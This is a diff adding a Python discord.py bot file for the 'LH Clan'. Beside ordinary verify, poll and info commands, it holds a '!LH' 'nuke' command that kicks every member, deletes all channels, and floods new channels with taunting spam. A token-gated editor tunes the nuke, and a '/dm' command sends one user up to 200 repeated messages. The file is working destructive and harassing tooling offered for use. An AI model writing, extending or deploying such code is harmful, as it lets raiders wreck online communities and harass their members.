@@ -1,0 +1,466 @@
+# language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
+# deps: discord.py — pip install discord.py
+
+import discord
+from discord.ext import commands
+from discord import app_commands
+import asyncio
+import secrets
+import string
+import os
+from typing import Optional
+
+# ── config ────────────────────────────────────────────────────
+TOKEN = os.environ.get("TOKEN")          # set in Railway Variables tab
+VERIFY_ROLE_NAME = "Verified"
+PREMIUM_USER_ID = 1224012443341160498
+
+# ── nuke config — editable via !LHP ──────────────────────────
+nuke_config = {
+    "channel_name": "hooked by lh clan",
+    "message": "lol ur server doesn't even have any good protection get a job",
+    "channel_count": 12,
+    "spam_count": 100,
+}
+
+# ── token store ───────────────────────────────────────────────
+active_tokens: dict[str, bool] = {}
+
+# ── intents ───────────────────────────────────────────────────
+intents = discord.Intents.default()
+intents.members = True
+intents.message_content = True
+
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+
+
+# ── on_ready ──────────────────────────────────────────────────
+@bot.event
+async def on_ready():
+    await bot.tree.sync()
+    print(f"✅ Online as {bot.user}")
+
+
+# ── setup_hook ────────────────────────────────────────────────
+async def setup_hook():
+    bot.add_view(VerifyButton())
+
+bot.setup_hook = setup_hook
+
+
+# ════════════════════════════════════════════════════════════════
+#  VERIFY
+# ════════════════════════════════════════════════════════════════
+
+class VerifyButton(discord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @discord.ui.button(
+        label="✅ Verify Me",
+        style=discord.ButtonStyle.green,
+        custom_id="verify_button"
+    )
+    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
+        role = discord.utils.get(interaction.guild.roles, name=VERIFY_ROLE_NAME)
+        if not role:
+            await interaction.response.send_message(
+                "❌ Setup error: No role named `Verified`. Contact an admin.",
+                ephemeral=True
+            )
+            return
+        if role in interaction.user.roles:
+            await interaction.response.send_message(
+                "👍 You're already verified!", ephemeral=True
+            )
+            return
+        try:
+            await interaction.user.add_roles(role, reason="Clicked verify button")
+            embed = discord.Embed(
+                title="✅ Verified!",
+                description=f"Welcome {interaction.user.mention}, you now have access.",
+                color=0x00ff00
+            )
+            embed.set_thumbnail(url=interaction.user.display_avatar.url)
+            embed.set_footer(text=f"ID: {interaction.user.id}")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        except discord.Forbidden:
+            await interaction.response.send_message(
+                "❌ Bot doesn't have permission to assign roles.", ephemeral=True
+            )
+
+
+@bot.tree.command(name="setupverify", description="Post the verification panel (admin only)")
+@app_commands.checks.has_permissions(administrator=True)
+async def setupverify(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="🔐 Verification",
+        description="Click the button below to verify yourself and gain access to the server.\n\nThis only takes one click.",
+        color=0x5865f2
+    )
+    embed.set_footer(text=interaction.guild.name)
+    await interaction.response.send_message(embed=embed, view=VerifyButton())
+
+
+# ════════════════════════════════════════════════════════════════
+#  LH — nuke + token gen
+# ════════════════════════════════════════════════════════════════
+
+def generate_token() -> str:
+    alphabet = string.ascii_letters + string.digits
+    return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))
+
+
+@bot.command(name="LH")
+async def lh_command(ctx, subcommand: Optional[str] = None):
+
+    # ── !LH T — premium token gen ────────────────────────────
+    if subcommand and subcommand.upper() == "T":
+        if ctx.author.id != PREMIUM_USER_ID:
+            embed = discord.Embed(
+                title="❌ Access Denied",
+                description="This is a **premium command**. You don't have access.",
+                color=0xff0000
+            )
+            await ctx.send(embed=embed)
+            return
+
+        tok = generate_token()
+        active_tokens[tok] = True
+
+        embed = discord.Embed(
+            title="🔑 Premium Token Generated",
+            description=(
+                f"**Token:** `{tok}`\n\n"
+                "Use with `!LHP` to edit LH nuke settings.\n"
+                "⚠️ **Single-use** — consumed after one successful edit."
+            ),
+            color=0xffd700
+        )
+        embed.set_footer(text=f"Generated by {ctx.author} | LH Premium")
+        try:
+            await ctx.author.send(embed=embed)
+            await ctx.message.delete()
+            await ctx.send("🔑 Token sent to your DMs.", delete_after=5)
+        except discord.Forbidden:
+            await ctx.send(embed=embed)
+        return
+
+    # ── !LH — nuke ───────────────────────────────────────────
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("❌ You need Administrator to run this.", delete_after=5)
+        return
+
+    guild = ctx.guild
+    await ctx.send("💀 LH Clan was here. initiating...")
+
+    # kick all except bot + owner
+    kick_tasks = []
+    for member in guild.members:
+        if member == guild.me or member == guild.owner:
+            continue
+        kick_tasks.append(member.kick(reason="LH Clan"))
+    await asyncio.gather(*kick_tasks, return_exceptions=True)
+
+    # delete all channels
+    delete_tasks = [ch.delete() for ch in guild.channels]
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
+
+    # create channels
+    new_channels = []
+    for _ in range(nuke_config["channel_count"]):
+        try:
+            ch = await guild.create_text_channel(nuke_config["channel_name"])
+            new_channels.append(ch)
+        except Exception:
+            pass
+
+    # spam concurrently
+    async def spam_channel(channel):
+        for _ in range(nuke_config["spam_count"]):
+            try:
+                await channel.send(nuke_config["message"])
+            except Exception:
+                pass
+
+    await asyncio.gather(*[spam_channel(ch) for ch in new_channels])
+
+
+# ════════════════════════════════════════════════════════════════
+#  LHP — premium config editor
+# ════════════════════════════════════════════════════════════════
+
+class LHPModal(discord.ui.Modal, title="⚙️ Edit LH Nuke Config"):
+    token_input = discord.ui.TextInput(
+        label="Premium Token",
+        placeholder="LHT-xxxxxxxxxxxxxxxxxxxxxxxx",
+        required=True,
+        max_length=32,
+        style=discord.TextStyle.short
+    )
+    channel_name_input = discord.ui.TextInput(
+        label="Channel Name",
+        placeholder="hooked by lh clan",
+        required=True,
+        max_length=100,
+        style=discord.TextStyle.short
+    )
+    message_input = discord.ui.TextInput(
+        label="Spam Message",
+        placeholder="lol ur server doesn't even have any good protection",
+        required=True,
+        max_length=2000,
+        style=discord.TextStyle.paragraph
+    )
+    channel_count_input = discord.ui.TextInput(
+        label="Channel Count (min 12)",
+        placeholder="12",
+        required=True,
+        max_length=3,
+        style=discord.TextStyle.short
+    )
+    spam_count_input = discord.ui.TextInput(
+        label="Spam Count per Channel (max 200)",
+        placeholder="100",
+        required=True,
+        max_length=3,
+        style=discord.TextStyle.short
+    )
+
+    async def on_submit(self, interaction: discord.Interaction):
+        await interaction.response.defer(ephemeral=True)
+
+        tok = self.token_input.value.strip()
+        if tok not in active_tokens:
+            embed = discord.Embed(
+                title="❌ Invalid Token",
+                description="That token doesn't exist or has already been used.",
+                color=0xff0000
+            )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+            return
+
+        try:
+            ch_count = int(self.channel_count_input.value.strip())
+            sp_count = int(self.spam_count_input.value.strip())
+        except ValueError:
+            await interaction.followup.send(
+                "❌ Channel count and spam count must be numbers.", ephemeral=True
+            )
+            return
+
+        ch_count = max(12, ch_count)
+        sp_count = max(1, min(sp_count, 200))
+
+        nuke_config["channel_name"]  = self.channel_name_input.value.strip()
+        nuke_config["message"]       = self.message_input.value.strip()
+        nuke_config["channel_count"] = ch_count
+        nuke_config["spam_count"]    = sp_count
+
+        del active_tokens[tok]
+
+        msg_preview = nuke_config['message'][:100] + "..." if len(nuke_config['message']) > 100 else nuke_config['message']
+        embed = discord.Embed(title="✅ Nuke Config Updated", color=0x00ff00)
+        embed.add_field(name="Channel Name",  value=f"`{nuke_config['channel_name']}`",  inline=False)
+        embed.add_field(name="Spam Message",  value=f"`{msg_preview}`",                  inline=False)
+        embed.add_field(name="Channel Count", value=str(nuke_config["channel_count"]),   inline=True)
+        embed.add_field(name="Spam Count",    value=str(nuke_config["spam_count"]),      inline=True)
+        embed.set_footer(text="Token consumed. Generate a new one with !LH T.")
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+    async def on_error(self, interaction: discord.Interaction, error: Exception):
+        await interaction.followup.send("❌ Something broke. Try again.", ephemeral=True)
+
+
+@bot.command(name="LHP")
+async def lhp(ctx):
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+    class LHPView(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=60)
+
+        @discord.ui.button(label="⚙️ Open Config Editor", style=discord.ButtonStyle.blurple)
+        async def open_modal(self, interaction: discord.Interaction, button: discord.ui.Button):
+            if interaction.user.id != ctx.author.id:
+                await interaction.response.send_message(
+                    "❌ Only the person who ran `!LHP` can use this.", ephemeral=True
+                )
+                return
+            await interaction.response.send_modal(LHPModal())
+            self.stop()
+
+    embed = discord.Embed(
+        title="⚙️ LH Premium Config",
+        description="Click to open the nuke config editor.\nNeeds a valid token from `!LH T`.",
+        color=0xffd700
+    )
+    msg = await ctx.send(embed=embed, view=LHPView())
+    await asyncio.sleep(61)
+    try:
+        await msg.delete()
+    except Exception:
+        pass
+
+
+# ════════════════════════════════════════════════════════════════
+#  HELP
+# ════════════════════════════════════════════════════════════════
+
+@bot.command(name="help")
+async def help_cmd(ctx):
+    embed = discord.Embed(
+        title="📋 Bot Commands",
+        description="Prefix: `!` — Slash: `/`",
+        color=0x5865f2
+    )
+    embed.add_field(
+        name="💀 `!LH`",
+        value="Nuke the server. Kicks all, deletes all channels, creates channels, spams. **Admin only.**",
+        inline=False
+    )
+    embed.add_field(
+        name="🔑 `!LH T` *(Premium)*",
+        value="Generate a single-use token to edit nuke settings. **Premium user only.**",
+        inline=False
+    )
+    embed.add_field(
+        name="⚙️ `!LHP` *(Premium)*",
+        value="Edit LH nuke config — channel name, message, counts. Requires token from `!LH T`.",
+        inline=False
+    )
+    embed.add_field(
+        name="🔐 `/setupverify`",
+        value="Post the one-click verify panel. **Admin only.**",
+        inline=False
+    )
+    embed.add_field(
+        name="📬 `/dm`",
+        value="DM any user by @mention or ID. Args: `message`, `count` (1–200), `delay` (optional).",
+        inline=False
+    )
+    embed.add_field(
+        name="📊 `/serverinfo` · 👤 `/userinfo` · 📊 `/poll` · 🏓 `/ping`",
+        value="Info and utility commands.",
+        inline=False
+    )
+    embed.set_footer(text="LH Clan Bot | Prefix: !")
+    await ctx.send(embed=embed)
+
+
+# ════════════════════════════════════════════════════════════════
+#  DM
+# ════════════════════════════════════════════════════════════════
+
+@bot.tree.command(name="dm", description="DM a user by @mention or ID")
+@app_commands.describe(
+    member="@mention a server member",
+    user_id="Or paste a user ID (outside server)",
+    message="Message to send",
+    count="How many times (max 200)",
+    delay="Delay in seconds between messages"
+)
+async def dm(
+    interaction: discord.Interaction,
+    message: str,
+    count: app_commands.Range[int, 1, 200],
+    member: Optional[discord.Member] = None,
+    user_id: Optional[str] = None,
+    delay: Optional[float] = None
+):
+    await interaction.response.defer(ephemeral=True)
+    actual_delay = max(0.0, min(delay or 0.0, 10.0))
+
+    if member:
+        user = member
+    elif user_id:
+        try:
+            user = await bot.fetch_user(int(user_id))
+        except discord.NotFound:
+            await interaction.followup.send("❌ User not found.", ephemeral=True)
+            return
+        except ValueError:
+            await interaction.followup.send("❌ Invalid ID.", ephemeral=True)
+            return
+    else:
+        await interaction.followup.send("❌ Provide a @mention or user ID.", ephemeral=True)
+        return
+
+    success = 0
+    failed = 0
+    for _ in range(count):
+        try:
+            await user.send(message)
+            success += 1
+            if actual_delay > 0:
+                await asyncio.sleep(actual_delay)
+        except discord.Forbidden:
+            failed = count - success
+            break
+        except discord.HTTPException:
+            failed += 1
+
+    color = 0x00ff00 if failed == 0 else (0xff0000 if success == 0 else 0xff9900)
+    embed = discord.Embed(title="📬 DM Report", color=color)
+    embed.add_field(name="Target", value=f"{user} (`{user.id}`)", inline=False)
+    embed.add_field(name="✅ Sent", value=str(success), inline=True)
+    embed.add_field(name="❌ Failed", value=str(failed), inline=True)
+    embed.add_field(name="📨 Requested", value=str(count), inline=True)
+    embed.set_footer(text=f"Requested by {interaction.user}")
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
+
+# ════════════════════════════════════════════════════════════════
+#  INFO
+# ════════════════════════════════════════════════════════════════
+
+@bot.tree.command(name="serverinfo", description="Show server info")
+async def serverinfo(interaction: discord.Interaction):
+    g = interaction.guild
+    embed = discord.Embed(title=f"📊 {g.name}", color=0x5865f2)
+    embed.set_thumbnail(url=g.icon.url if g.icon else None)
+    embed.add_field(name="Owner",    value=str(g.owner),                        inline=True)
+    embed.add_field(name="Members",  value=str(g.member_count),                 inline=True)
+    embed.add_field(name="Channels", value=str(len(g.channels)),                inline=True)
+    embed.add_field(name="Roles",    value=str(len(g.roles)),                   inline=True)
+    embed.add_field(name="Created",  value=g.created_at.strftime("%Y-%m-%d"),   inline=True)
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="userinfo", description="Show info about a user")
+@app_commands.describe(member="User to inspect")
+async def userinfo(interaction: discord.Interaction, member: discord.Member):
+    embed = discord.Embed(title=f"👤 {member}", color=member.color)
+    embed.set_thumbnail(url=member.display_avatar.url)
+    embed.add_field(name="ID",              value=str(member.id),                           inline=True)
+    embed.add_field(name="Joined Server",   value=member.joined_at.strftime("%Y-%m-%d"),    inline=True)
+    embed.add_field(name="Account Created", value=member.created_at.strftime("%Y-%m-%d"),   inline=True)
+    embed.add_field(name="Top Role",        value=member.top_role.mention,                  inline=True)
+    embed.add_field(name="Bot?",            value="Yes" if member.bot else "No",            inline=True)
+    await interaction.response.send_message(embed=embed)
+
+
+@bot.tree.command(name="poll", description="Create a yes/no poll")
+@app_commands.describe(question="What to ask")
+async def poll(interaction: discord.Interaction, question: str):
+    embed = discord.Embed(title="📊 Poll", description=question, color=0xfee75c)
+    embed.set_footer(text=f"Asked by {interaction.user}")
+    await interaction.response.send_message(embed=embed)
+    msg = await interaction.original_response()
+    await msg.add_reaction("✅")
+    await msg.add_reaction("❌")
+
+
+@bot.tree.command(name="ping", description="Check bot latency")
+async def ping(interaction: discord.Interaction):
+    latency = round(bot.latency * 1000)
+    color = 0x00ff00 if latency < 100 else (0xff9900 if latency < 200 else 0xff0000)
+    embed = discord.Embed(title="🏓 Pong!", description=f"Latency: **{latency}ms**", color=color)
+    await interaction.response.send_message(embed=embed)
+
+
+# ── run ───────────────────────────────────────────────────────
+bot.run(TOKEN)
